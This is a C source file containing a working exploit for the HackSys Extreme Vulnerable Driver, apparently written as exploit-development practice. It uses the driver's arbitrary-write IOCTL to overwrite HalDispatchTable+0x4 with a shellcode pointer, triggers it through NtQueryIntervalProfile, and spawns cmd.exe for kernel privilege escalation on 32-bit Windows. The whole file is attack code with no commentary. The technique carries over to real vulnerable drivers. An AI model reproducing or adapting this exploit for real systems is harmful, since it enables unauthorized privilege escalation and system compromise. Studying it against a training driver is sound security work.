#include<stdio.h>
#include<Windows.h>
#include<Psapi.h>
#include<profileapi.h>

#include "x86-header.h"

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_ARBITRARY_WRITE                               IOCTL(0x802)

typedef struct _WRITE_WHAT_WHERE
{
	PULONG_PTR What;
	PULONG_PTR Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

int main()
{
	int NTStatus = 0;
	WORD recvbuf;

	puts("[+] Start...");
	HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
	{
		puts("Failed to Open Device");
		return 0;
	}

	PVOID pNtkrnlpaBase = GetKernelBase("ntkrnlpa.exe");
	printf("[*] Get ntkrnlpa.exe kernel base: 0x%p\n", pNtkrnlpaBase);

	HMODULE ntkrnlpaBase = LoadLibraryA("ntkrnlpa.exe");
	if (ntkrnlpaBase == 0)
	{
		puts("Failed to load ntkrnlpa.exe");
		return 0;
	}
	PVOID pUserSpaceAddress = GetProcAddress(ntkrnlpaBase, "HalDispatchTable");

	DWORD HalDispatchTable_4 = (DWORD)pNtkrnlpaBase + ((DWORD)pUserSpaceAddress - (DWORD)ntkrnlpaBase) + 4;
	if (HalDispatchTable_4 != 0)
		printf("[*] Get HalDispatchTable+0x4 0x%lx\n", HalDispatchTable_4);

	PVOID sc = &ShellCode;

	WRITE_WHAT_WHERE a;
	a.What = (PULONG_PTR)&sc;
	a.Where = (PULONG_PTR)HalDispatchTable_4;

	puts("[+] Trigger Arbitrary Write");
	DeviceIoControl(hDevice, HEVD_IOCTL_ARBITRARY_WRITE, &a, sizeof(a), NULL, 0, &recvbuf, NULL);

	HMODULE hModule = LoadLibraryA("ntdll.dll");
	if (hModule == 0)
	{
		puts("Failed to load ntdll.dll");
		return 0;
	}
	NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(hModule, "NtQueryIntervalProfile");
	if (NtQueryIntervalProfile == 0)
	{
		puts("Failed to resolve NtQueryIntervalProfile");
		return 0;
	}
	DWORD interVal = 0;
	NtQueryIntervalProfile(0x1337, &interVal);

	puts("[+] cmd.exe...");
	CreateCmd();

	return 0;
}